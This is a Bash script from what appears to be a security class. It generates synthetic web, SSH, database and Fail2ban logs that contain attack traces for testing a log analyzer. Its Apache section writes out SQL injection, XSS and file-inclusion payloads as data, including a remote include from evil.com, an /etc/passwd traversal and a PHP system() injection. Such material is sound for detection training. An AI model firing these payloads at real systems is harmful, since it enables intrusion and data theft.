#!/bin/bash

# ===================================================================================
# GERADOR DE LOGS REALISTAS PARA TESTE DE SEGURANÇA
# ===================================================================================
# Gera logs idênticos aos reais com ataques e comportamentos suspeitos
# Autor: Jackson Savoldi | ACADe-TI - Aula 04
# ===================================================================================

# Cores
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[37m"
BOLD="\e[1m"
RESET="\e[0m"

# Diretório de saída
OUTPUT_DIR="logs_realistas"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Função para gerar timestamp realista
generate_timestamp() {
    local start_date="$1"
    local interval="$2"
    local current_date=$(date -d "$start_date + $interval seconds" '+%d/%b/%Y:%H:%M:%S %z')
    echo "$current_date"
}

# Função para gerar IP realista
generate_ip() {
    local ips=(
        "192.168.1.100"  # Rede interna
        "10.0.0.50"      # Rede interna
        "172.16.0.25"    # Rede interna
        "203.0.113.45"   # TEST-NET
        "198.51.100.123" # TEST-NET
        "185.220.101.45" # IP suspeito real
        "45.95.147.12"   # IP suspeito real
        "91.234.36.78"   # IP suspeito real
        "103.21.244.34"  # IP suspeito real
        "8.8.8.8"        # Google DNS (normal)
        "1.1.1.1"        # Cloudflare DNS (normal)
    )
    echo "${ips[$((RANDOM % ${#ips[@]}))]}"
}

# Função para gerar User-Agent realista
generate_user_agent() {
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        "curl/7.68.0"
        "wget/1.20.3"
        "python-requests/2.25.1"
        "nikto/2.1.6"
        "sqlmap/1.5.12"
        "dirb/2.22"
        "gobuster/v3.1.0"
        "nmap/7.80"
        "wpscan/3.8.22"
    )
    echo "${user_agents[$((RANDOM % ${#user_agents[@]}))]}"
}

# Função para gerar Apache Access Log realista
generate_apache_access_log() {
    local output_file="$OUTPUT_DIR/apache_access_real.log"
    local start_date="2025-06-29 08:00:00"
    local interval=0
    
    echo -e "${BOLD}${CYAN}🌐 Gerando Apache Access Log realista...${RESET}"
    
    # Limpa arquivo
    > "$output_file"
    
    # Tráfego normal
    for i in {1..50}; do
        local ip=$(generate_ip)
        local timestamp=$(generate_timestamp "$start_date" $interval)
        local user_agent=$(generate_user_agent)
        
        # Páginas normais
        local pages=("/" "/index.html" "/about" "/contact" "/products" "/css/style.css" "/js/main.js" "/images/logo.png")
        local page="${pages[$((RANDOM % ${#pages[@]}))]}"
        
        echo "$ip - - [$timestamp] \"GET $page HTTP/1.1\" 200 1234 \"-\" \"$user_agent\"" >> "$output_file"
        interval=$((interval + $((RANDOM % 30 + 5))))
    done
    
    # Tentativas de ataque SQL Injection
    for i in {1..10}; do
        local ip=$(generate_ip)
        local timestamp=$(generate_timestamp "$start_date" $interval)
        local user_agent="sqlmap/1.5.12"
        
        local payloads=(
            "id=1' OR '1'='1"
            "id=1' UNION SELECT * FROM users--"
            "id=1' AND 1=1--"
            "id=1' DROP TABLE users--"
            "id=1' INSERT INTO users VALUES (1,'admin','password')--"
        )
        local payload="${payloads[$((RANDOM % ${#payloads[@]}))]}"
        
        echo "$ip - - [$timestamp] \"GET /search.php?$payload HTTP/1.1\" 200 512 \"-\" \"$user_agent\"" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    # Tentativas de XSS
    for i in {1..8}; do
        local ip=$(generate_ip)
        local timestamp=$(generate_timestamp "$start_date" $interval)
        local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        local payloads=(
            "q=<script>alert('XSS')</script>"
            "q=<img src=x onerror=alert('XSS')>"
            "q=javascript:alert('XSS')"
            "q=<svg onload=alert('XSS')>"
            "q=<iframe src=javascript:alert('XSS')>"
        )
        local payload="${payloads[$((RANDOM % ${#payloads[@]}))]}"
        
        echo "$ip - - [$timestamp] \"GET /search?$payload HTTP/1.1\" 200 1024 \"-\" \"$user_agent\"" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    # Tentativas de LFI/RFI
    for i in {1..5}; do
        local ip=$(generate_ip)
        local timestamp=$(generate_timestamp "$start_date" $interval)
        local user_agent="curl/7.68.0"
        
        local payloads=(
            "page=../../../etc/passwd"
            "page=../../../../var/log/apache2/access.log"
            "page=php://filter/convert.base64-encode/resource=index.php"
            "page=http://evil.com/shell.txt"
            "page=data://text/plain,<?php system('ls'); ?>"
        )
        local payload="${payloads[$((RANDOM % ${#payloads[@]}))]}"
        
        echo "$ip - - [$timestamp] \"GET /include.php?$payload HTTP/1.1\" 200 2048 \"-\" \"$user_agent\"" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    # Scanner de vulnerabilidades
    for i in {1..15}; do
        local ip=$(generate_ip)
        local timestamp=$(generate_timestamp "$start_date" $interval)
        local user_agent="nikto/2.1.6"
        
        local targets=(
            "/admin/"
            "/wp-admin/"
            "/phpmyadmin/"
            "/server-status"
            "/.env"
            "/.git/config"
            "/.htaccess"
            "/config.php"
            "/backup.sql"
            "/shell.php"
        )
        local target="${targets[$((RANDOM % ${#targets[@]}))]}"
        
        echo "$ip - - [$timestamp] \"GET $target HTTP/1.1\" 403 489 \"-\" \"$user_agent\"" >> "$output_file"
        interval=$((interval + $((RANDOM % 5 + 1))))
    done
    
    # Enumeração de diretórios
    for i in {1..12}; do
        local ip=$(generate_ip)
        local timestamp=$(generate_timestamp "$start_date" $interval)
        local user_agent="dirb/2.22"
        
        local dirs=(
            "/admin"
            "/backup"
            "/config"
            "/database"
            "/files"
            "/images"
            "/includes"
            "/js"
            "/css"
            "/uploads"
            "/temp"
            "/logs"
        )
        local dir="${dirs[$((RANDOM % ${#dirs[@]}))]}"
        
        echo "$ip - - [$timestamp] \"GET $dir HTTP/1.1\" 404 162 \"-\" \"$user_agent\"" >> "$output_file"
        interval=$((interval + $((RANDOM % 3 + 1))))
    done
    
    echo -e "${GREEN}✅ Apache Access Log gerado: $output_file${RESET}"
}

# Função para gerar SSH Auth Log realista
generate_ssh_auth_log() {
    local output_file="$OUTPUT_DIR/ssh_auth_real.log"
    local start_date="2025-06-29 08:00:00"
    local interval=0
    
    echo -e "${BOLD}${CYAN}🔐 Gerando SSH Auth Log realista...${RESET}"
    
    # Limpa arquivo
    > "$output_file"
    
    # Logins normais
    for i in {1..20}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%b %d %H:%M:%S')
        local users=("admin" "user" "jackson" "developer" "test")
        local user="${users[$((RANDOM % ${#users[@]}))]}"
        
        echo "Jun 29 $timestamp server1 sshd[12345]: Accepted password for $user from $ip port 12345 ssh2" >> "$output_file"
        interval=$((interval + $((RANDOM % 300 + 60))))
    done
    
    # Tentativas de brute force
    for i in {1..50}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%b %d %H:%M:%S')
        local users=("admin" "root" "test" "guest" "user" "administrator" "mysql" "oracle")
        local user="${users[$((RANDOM % ${#users[@]}))]}"
        
        echo "Jun 29 $timestamp server1 sshd[12345]: Failed password for $user from $ip port 12345 ssh2" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    # Tentativas com usuários inválidos
    for i in {1..30}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%b %d %H:%M:%S')
        local users=("hacker" "test123" "admin123" "root123" "user123" "guest123")
        local user="${users[$((RANDOM % ${#users[@]}))]}"
        
        echo "Jun 29 $timestamp server1 sshd[12345]: Invalid user $user from $ip port 12345 ssh2" >> "$output_file"
        interval=$((interval + $((RANDOM % 5 + 1))))
    done
    
    # Conexões rejeitadas
    for i in {1..15}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%b %d %H:%M:%S')
        
        echo "Jun 29 $timestamp server1 sshd[12345]: Connection closed by $ip port 12345 [preauth]" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    echo -e "${GREEN}✅ SSH Auth Log gerado: $output_file${RESET}"
}

# Função para gerar Nginx Error Log realista
generate_nginx_error_log() {
    local output_file="$OUTPUT_DIR/nginx_error_real.log"
    local start_date="2025-06-29 08:00:00"
    local interval=0
    
    echo -e "${BOLD}${CYAN}⚠️  Gerando Nginx Error Log realista...${RESET}"
    
    # Limpa arquivo
    > "$output_file"
    
    # Erros de permissão
    for i in {1..10}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y/%m/%d %H:%M:%S')
        
        echo "$timestamp [error] 12345#12345: *12345 open() \"/var/www/html/.env\" failed (13: Permission denied), client: $ip" >> "$output_file"
        interval=$((interval + $((RANDOM % 30 + 10))))
    done
    
    # Tentativas de acesso a arquivos sensíveis
    for i in {1..8}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y/%m/%d %H:%M:%S')
        
        local files=(
            "/var/www/html/.git/config"
            "/var/www/html/config.php"
            "/var/www/html/backup.sql"
            "/var/www/html/wp-config.php"
            "/var/www/html/admin/config.php"
        )
        local file="${files[$((RANDOM % ${#files[@]}))]}"
        
        echo "$timestamp [error] 12345#12345: *12345 open() \"$file\" failed (2: No such file or directory), client: $ip" >> "$output_file"
        interval=$((interval + $((RANDOM % 20 + 5))))
    done
    
    # Erros de PHP
    for i in {1..5}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y/%m/%d %H:%M:%S')
        
        echo "$timestamp [error] 12345#12345: *12345 FastCGI sent in stderr: \"PHP message: PHP Warning: include() [function.include]: Failed opening 'shell.php' for inclusion\" while reading response header from upstream, client: $ip" >> "$output_file"
        interval=$((interval + $((RANDOM % 60 + 30))))
    done
    
    echo -e "${GREEN}✅ Nginx Error Log gerado: $output_file${RESET}"
}

# Função para gerar MySQL Log realista
generate_mysql_log() {
    local output_file="$OUTPUT_DIR/mysql_real.log"
    local start_date="2025-06-29 08:00:00"
    local interval=0
    
    echo -e "${BOLD}${CYAN}🗄️  Gerando MySQL Log realista...${RESET}"
    
    # Limpa arquivo
    > "$output_file"
    
    # Conexões normais
    for i in {1..15}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y-%m-%dT%H:%M:%S.%NZ')
        local users=("app_user" "web_user" "developer" "test_user")
        local user="${users[$((RANDOM % ${#users[@]}))]}"
        
        echo "$timestamp 123 Connect $user@$ip on database_name" >> "$output_file"
        interval=$((interval + $((RANDOM % 300 + 60))))
    done
    
    # Tentativas de acesso negado
    for i in {1..20}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y-%m-%dT%H:%M:%S.%NZ')
        local users=("root" "admin" "hacker" "test123" "admin123")
        local user="${users[$((RANDOM % ${#users[@]}))]}"
        
        echo "$timestamp 123 Connect Access denied for user '$user'@'$ip' (using password: YES)" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    # Queries suspeitas
    for i in {1..10}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y-%m-%dT%H:%M:%S.%NZ')
        
        local queries=(
            "SELECT * FROM users WHERE id=1 OR 1=1"
            "SELECT * FROM information_schema.tables"
            "SHOW DATABASES"
            "SHOW TABLES"
            "SELECT * FROM mysql.user"
        )
        local query="${queries[$((RANDOM % ${#queries[@]}))]}"
        
        echo "$timestamp 123 Query $query" >> "$output_file"
        interval=$((interval + $((RANDOM % 30 + 10))))
    done
    
    echo -e "${GREEN}✅ MySQL Log gerado: $output_file${RESET}"
}

# Função para gerar Fail2ban Log realista
generate_fail2ban_log() {
    local output_file="$OUTPUT_DIR/fail2ban_real.log"
    local start_date="2025-06-29 08:00:00"
    local interval=0
    
    echo -e "${BOLD}${CYAN}🛡️  Gerando Fail2ban Log realista...${RESET}"
    
    # Limpa arquivo
    > "$output_file"
    
    # IPs banidos
    for i in {1..25}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y-%m-%d %H:%M:%S')
        
        echo "$timestamp fail2ban.actions: WARNING [sshd] Ban $ip" >> "$output_file"
        interval=$((interval + $((RANDOM % 60 + 30))))
    done
    
    # Tentativas de ataque
    for i in {1..40}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y-%m-%d %H:%M:%S')
        
        echo "$timestamp fail2ban.filter: INFO [sshd] Found $ip - 2025-06-29 10:30:45" >> "$output_file"
        interval=$((interval + $((RANDOM % 10 + 2))))
    done
    
    # IPs desbanidos
    for i in {1..10}; do
        local ip=$(generate_ip)
        local timestamp=$(date -d "$start_date + $interval seconds" '+%Y-%m-%d %H:%M:%S')
        
        echo "$timestamp fail2ban.actions: WARNING [sshd] Unban $ip" >> "$output_file"
        interval=$((interval + $((RANDOM % 300 + 180))))
    done
    
    echo -e "${GREEN}✅ Fail2ban Log gerado: $output_file${RESET}"
}

# Função principal
main() {
    echo -e "${BOLD}${CYAN}🚀 GERADOR DE LOGS REALISTAS PARA TESTE DE SEGURANÇA${RESET}"
    echo -e "${BOLD}${CYAN}==================================================${RESET}"
    echo -e "${BOLD}Data/Hora: $(date '+%Y-%m-%d %H:%M:%S')${RESET}"
    echo ""
    
    # Cria diretório de saída
    mkdir -p "$OUTPUT_DIR"
    
    echo -e "${BOLD}📁 Diretório de saída: $OUTPUT_DIR${RESET}"
    echo ""
    
    # Gera todos os tipos de log
    generate_apache_access_log
    generate_ssh_auth_log
    generate_nginx_error_log
    generate_mysql_log
    generate_fail2ban_log
    
    echo ""
    echo -e "${BOLD}${GREEN}🎉 TODOS OS LOGS REALISTAS GERADOS!${RESET}"
    echo ""
    echo -e "${BOLD}📊 RESUMO DOS ARQUIVOS CRIADOS:${RESET}"
    echo -e "  🌐 apache_access_real.log - Ataques web (SQLi, XSS, LFI, Scanner)"
    echo -e "  🔐 ssh_auth_real.log - Brute force SSH e tentativas de login"
    echo -e "  ⚠️  nginx_error_real.log - Erros de segurança e tentativas de acesso"
    echo -e "  🗄️  mysql_real.log - Tentativas de acesso ao banco de dados"
    echo -e "  🛡️  fail2ban_real.log - IPs banidos e tentativas de ataque"
    echo ""
    echo -e "${BOLD}💡 PRÓXIMOS PASSOS:${RESET}"
    echo -e "  1. Testar com o sistema de análise: bash teste_completo_sistema.sh"
    echo -e "  2. Analisar resultados e identificar melhorias"
    echo -e "  3. Ajustar padrões baseado nos dados realistas"
    echo ""
    echo -e "${BOLD}📋 COMANDO PARA TESTAR:${RESET}"
    echo -e "  bash scriptlogs_avancado.sh -v -t -aR -gT -pedago -pcn -peso -correl $OUTPUT_DIR/apache_access_real.log"
}

# Executa função principal
main "$@" 